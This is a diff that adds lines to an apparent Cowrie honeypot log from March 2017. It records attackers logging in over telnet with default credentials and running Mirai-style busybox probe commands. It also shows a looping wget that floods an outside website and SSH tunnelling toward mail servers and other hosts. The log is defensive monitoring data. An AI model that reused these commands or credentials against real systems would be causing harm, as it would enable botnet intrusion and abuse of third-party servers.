@@ -2087,3 +2087,137 @@
 2017-03-28T22:18:01+0000 [CowrieTelnetTransport,142768,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hydrogrow.co.il:80/ > /dev/null 2> /dev/null; done" &
 2017-03-28T22:18:01+0000 [CowrieTelnetTransport,142768,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.hydrogrow.co.il:80/ > /dev/null 2> /dev/null; done" &
 2017-03-28T22:18:01+0000 [CowrieTelnetTransport,142768,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.hydrogrow.co.il:80/ > /dev/null 2> /dev/null; done"
+2017-03-28T22:18:02+0000 [CowrieTelnetTransport,142769,79.178.27.94] first time for 79.178.27.94, need: 1
+2017-03-28T22:18:02+0000 [CowrieTelnetTransport,142769,79.178.27.94] login attempt: 1
+2017-03-28T22:18:04+0000 [CowrieTelnetTransport,142769,79.178.27.94] login attempt [admin/54321] succeeded
+2017-03-28T22:18:05+0000 [CowrieTelnetTransport,142769,79.178.27.94] Opening TTY Log: log/tty/20170328-221805-None-142769i.log
+2017-03-28T22:18:05+0000 [CowrieTelnetTransport,142769,79.178.27.94] Warning: state changed and new state returned
+2017-03-28T22:18:05+0000 [-] 'bind' failed auth 'password'
+2017-03-28T22:18:05+0000 [-] unauthorized login: 
+2017-03-28T22:18:05+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-03-28T22:18:05+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
+	    self.runUntilCurrent()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 878, in runUntilCurrent
+	    call.func(*call.args, **call.kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/userauth.py", line 251, in _ebBadAuth
+	    NS(b','.join(self.supportedAuthentications)) + b'\x00')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/transport.py", line 637, in sendPacket
+	    self.transport.write(encPacket)
+	exceptions.AttributeError: 'NoneType' object has no attribute 'write'
+	
+2017-03-28T22:18:05+0000 [SSHChannel None (1008) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:05+0000 [SSHChannel None (1008) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:05+0000 [SSHChannel None (1008) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1008
+2017-03-28T22:18:05+0000 [SSHChannel None (1009) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:05+0000 [SSHChannel None (1009) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:05+0000 [SSHChannel None (1009) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1009
+2017-03-28T22:18:05+0000 [SSHChannel None (1010) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:05+0000 [SSHChannel None (1010) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:05+0000 [SSHChannel None (1010) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1010
+2017-03-28T22:18:05+0000 [SSHChannel None (1011) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:05+0000 [SSHChannel None (1011) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:05+0000 [SSHChannel None (1011) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1011
+2017-03-28T22:18:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59746,194.88.106.187] got channel 'direct-tcpip' request
+2017-03-28T22:18:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59746,194.88.106.187] direct-tcp connection request to 23.223.42.213:443 from localhost:5556
+2017-03-28T22:18:05+0000 [SSHChannel None (187) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59746,194.88.106.187] direct-tcp forward to 23.223.42.213:443 with data '\x16\x03\x03\x00\xb9\x01\x00\x00\xb5\x03\x03X\xda\xe1\x08n|"@\xca\x9boz(\xa8i\xe7FE\xf1d\x80\x13\xda\x7f\xb9A\x11\x84\xd8}\'\x88\x00\x004\xc0(\xc0\'\xc0\x14\xc0\x13\x00\x9f\x00\x9e\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\xc0,\xc0+\xc0$\xc0#\xc0\n\xc0\t\x00j\x00@\x008\x002\x00\n\x00\x13\x00\x05\x00\x04\x01\x00\x00X\x00\x00\x00\x1f\x00\x1d\x00\x00\x1aauth.np.ac.playstation.net\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00\r\x00\x14\x00\x12\x06\x01\x06\x03\x04\x01\x05\x01\x02\x01\x04\x03\x05\x03\x02\x03\x02\x02\x00#\x00\x00\x00\x17\x00\x00\xff\x01\x00\x01\x00'
+2017-03-28T22:18:05+0000 [SSHChannel None (187) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59746,194.88.106.187] failed to connect: Connection refused
+2017-03-28T22:18:05+0000 [SSHChannel None (187) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59746,194.88.106.187] sending close 187
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: enable
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: enable 
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Reading txtcmd from "txtcmds/bin/enable"
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: shell
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command not found: shell
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: sh
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: sh 
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: cat /proc/mounts; /bin/busybox KEVRE
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: cat /proc/mounts
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: /bin/busybox KEVRE
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: cd /dev/shm; (cat .s || cp /bin/echo .s); /bin/busybox KEVRE
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: cd /dev/shm
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: cat .s
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: cp /bin/echo .s
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: /bin/busybox KEVRE
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: nc; wget; /bin/busybox KEVRE
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command not found: nc
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: wget 
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: /bin/busybox KEVRE
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: (dd bs=52 count=1 if=.s || cat .s)
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command not found: dd bs=52 count=1 if=.s
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: cat /dev/shm/.s
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] CMD: /bin/busybox KEVRE
+2017-03-28T22:18:06+0000 [CowrieTelnetTransport,142769,79.178.27.94] Command found: /bin/busybox KEVRE
+2017-03-28T22:18:08+0000 [SSHChannel None (1014) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:08+0000 [SSHChannel None (1014) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:08+0000 [SSHChannel None (1014) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1014
+2017-03-28T22:18:08+0000 [SSHChannel None (1012) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:08+0000 [SSHChannel None (1012) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:08+0000 [SSHChannel None (1012) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1012
+2017-03-28T22:18:08+0000 [SSHChannel None (1013) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:08+0000 [SSHChannel None (1013) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:08+0000 [SSHChannel None (1013) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1013
+2017-03-28T22:18:09+0000 [SSHChannel None (1015) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:09+0000 [SSHChannel None (1015) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:09+0000 [SSHChannel None (1015) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1015
+2017-03-28T22:18:10+0000 [SSHChannel None (1017) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:10+0000 [SSHChannel None (1017) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:10+0000 [SSHChannel None (1017) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1017
+2017-03-28T22:18:11+0000 [SSHChannel None (1016) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:11+0000 [SSHChannel None (1016) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:11+0000 [SSHChannel None (1016) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1016
+2017-03-28T22:18:12+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-28T22:18:12+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] direct-tcp connection request to 144.160.235.144:25 from localhost:5556
+2017-03-28T22:18:17+0000 [SSHChannel None (102) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59772,194.88.106.206] remote eof
+2017-03-28T22:18:17+0000 [SSHChannel None (102) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59772,194.88.106.206] remote close
+2017-03-28T22:18:17+0000 [SSHChannel None (102) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59772,194.88.106.206] sending close 102
+2017-03-28T22:18:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-28T22:18:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-03-28T22:18:23+0000 [SSHChannel None (1018) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:24+0000 [SSHChannel None (1018) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:24+0000 [SSHChannel None (1018) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1018
+2017-03-28T22:18:24+0000 [SSHChannel None (1019) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:24+0000 [SSHChannel None (1019) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:24+0000 [SSHChannel None (1019) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1019
+2017-03-28T22:18:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-28T22:18:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] direct-tcp connection request to 144.160.235.143:25 from localhost:5556
+2017-03-28T22:18:28+0000 [SSHChannel None (1020) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:28+0000 [SSHChannel None (1020) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:28+0000 [SSHChannel None (1020) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1020
+2017-03-28T22:18:32+0000 [SSHChannel None (1021) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] direct-tcp forward to 65.54.188.110:25 with data 'QUIT\r\n'
+2017-03-28T22:18:32+0000 [SSHChannel None (1021) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] failed to connect: Connection refused
+2017-03-28T22:18:32+0000 [SSHChannel None (1021) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1021
+2017-03-28T22:18:32+0000 [SSHChannel None (1021) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:32+0000 [SSHChannel None (1021) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:34+0000 [SSHChannel None (1022) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] direct-tcp forward to 72.35.12.4:25 with data 'QUIT\r\n'
+2017-03-28T22:18:34+0000 [SSHChannel None (1022) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] failed to connect: Connection refused
+2017-03-28T22:18:34+0000 [SSHChannel None (1022) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1022
+2017-03-28T22:18:34+0000 [SSHChannel None (1022) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:34+0000 [SSHChannel None (1022) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59749,194.88.106.210] got channel 'direct-tcpip' request
+2017-03-28T22:18:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59749,194.88.106.210] direct-tcp connection request to 136.243.80.213:80 from localhost:5556
+2017-03-28T22:18:36+0000 [SSHChannel None (28) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59749,194.88.106.210] direct-tcp forward to 136.243.80.213:80 with data 'GET /internals/api/ip?1490739496943521426 HTTP/1.1\r\nHost: ip.adspy.mobi\r\nConnection: close\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip\r\n\r\n'
+2017-03-28T22:18:36+0000 [SSHChannel None (28) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59749,194.88.106.210] failed to connect: Connection refused
+2017-03-28T22:18:36+0000 [SSHChannel None (28) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59749,194.88.106.210] sending close 28
+2017-03-28T22:18:39+0000 [SSHChannel None (1023) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:39+0000 [SSHChannel None (1023) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:39+0000 [SSHChannel None (1023) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1023
+2017-03-28T22:18:41+0000 [SSHChannel None (1024) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote eof
+2017-03-28T22:18:41+0000 [SSHChannel None (1024) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] remote close
+2017-03-28T22:18:41+0000 [SSHChannel None (1024) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59770,194.88.106.181] sending close 1024
+2017-03-28T22:18:51+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 89.46.196.37:53651 (10.8.41.81:2223) [session: TT142770]
+2017-03-28T22:18:51+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 89.46.196.37:54690 (10.8.41.81:2223) [session: TT142771]
+2017-03-28T22:18:56+0000 [CowrieTelnetTransport,142771,89.46.196.37] login attempt: 226
+2017-03-28T22:18:56+0000 [CowrieTelnetTransport,142771,89.46.196.37] login return, expect: [admin/5up]
+2017-03-28T22:18:58+0000 [CowrieTelnetTransport,142771,89.46.196.37] login attempt [admin/5up] succeeded
+2017-03-28T22:18:59+0000 [CowrieTelnetTransport,142771,89.46.196.37] Opening TTY Log: log/tty/20170328-221859-None-142771i.log
+2017-03-28T22:18:59+0000 [CowrieTelnetTransport,142771,89.46.196.37] Warning: state changed and new state returned
+2017-03-28T22:19:00+0000 [CowrieTelnetTransport,142770,89.46.196.37] login attempt: 227
+2017-03-28T22:19:00+0000 [CowrieTelnetTransport,142770,89.46.196.37] login return, expect: [admin/5up]
